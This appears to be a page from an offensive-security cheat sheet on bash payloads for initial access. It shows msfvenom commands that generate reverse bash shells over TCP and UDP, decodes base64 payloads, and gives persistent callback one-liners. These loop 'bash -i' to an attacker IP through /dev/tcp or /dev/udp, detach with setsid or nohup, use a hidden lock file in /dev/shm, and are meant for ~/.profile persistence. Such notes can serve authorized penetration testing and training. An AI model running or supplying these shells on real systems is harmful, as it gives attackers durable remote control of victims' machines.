---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - T1059-004
  - linux
---
# Bash

> [!INFO] [Character Maximum Limit](https://www.cyberciti.biz/faq/linux-unix-arg_max-maximum-length-of-arguments/)
> The maximum length of characters is a total of **2090326** when executing through a shell. Running `xargs` provides the default buffer length limit:
> ```
$ xargs --show-limits --no-run-if-empty </dev/null
Your environment variables take up 2389 bytes  
POSIX upper limit on argument length (this system): 2092715  
POSIX smallest allowable upper limit on argument length (all systems): 4096  
Maximum length of command we could actually use: 2090326  
Size of command buffer we are actually using: 131072  
Maximum parallelism (--max-procs must be no greater): 2147483647
> ```
> Even `ARG_MAX` environment variable can determine the limit of arguments.

## 01 - Common Files

```
/bin/bash
/usr/bin/bash
```

## 02 - Base64 Encoded

You can encode it with base64 then execute it.

```
$ echo <base64_payload> | base64 -d

$ echo <base64_payload> | basenc --base64 -d
```

## 03 - Generate Payload

### 3.1 - TCP Protocol

```
$ msfvenom -p cmd/unix/reverse_bash lhost=<IP> lport=<PORT>
```

### 3.2 - UDP Protocol

```
$ msfvenom -p cmd/unix/reverse_bash_udp lhost=<IP> lport=<PORT>
```

## 04 - Execute Payloads

### 4.1 - Persistent Callback Shell

In case you might lose the callback connection. It's better to make it persistent.

```
$ while true; do /bin/bash -c /path/to/payload; sleep 10; done

$ while true; do /bin/bash -i >& /dev/<protocol>/<attacker_IP>/<attacker_PORT> 0>&1; sleep 10; done

$ setsid bash -c 'while :; do bash -i &>/dev/<protocol>/<attacker_IP>/<attacker_PORT> 0>&1; sleep 360; done' &>/dev/null
```

Prevents multiple instances while written in `~/.profile`.

```
$ fuser /dev/shm/.busy &>/dev/null || nohup /bin/bash -c 'while :; do touch /dev/shm/.busy; exec 3</dev/shm/.busy; bash -i &>/dev/<protocol>/<attacker_IP>/<attacker_PORT> 0>&1 ; sleep 360; done' &>/dev/null &
```

---
## References

### Source Repositories

- [hackerschoice: THC's favourite Tips, Tricks & Hacks (Cheat Sheet)](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet)

### Hacktricks

- [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/linux-hardening/bypass-bash-restrictions/index.html)